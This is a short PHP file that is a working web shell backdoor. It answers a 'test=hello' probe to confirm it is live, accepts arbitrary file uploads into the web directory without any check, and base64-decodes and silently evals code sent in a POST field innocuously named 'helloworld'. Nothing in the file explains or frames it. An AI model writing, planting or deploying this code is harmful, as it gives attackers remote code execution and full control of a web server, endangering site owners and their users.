<?php




if (isset($_GET["test"]) && $_GET["test"]=="hello"){
echo "testtrue";
}
elseif(isset($_FILES["filename"]["tmp_name"])){if(is_uploaded_file($_FILES["filename"]["tmp_name"])){
move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
echo "true";
}}
elseif(isset($_POST['helloworld'])){ $uidmail = base64_decode($_POST['helloworld']); @eval($uidmail); }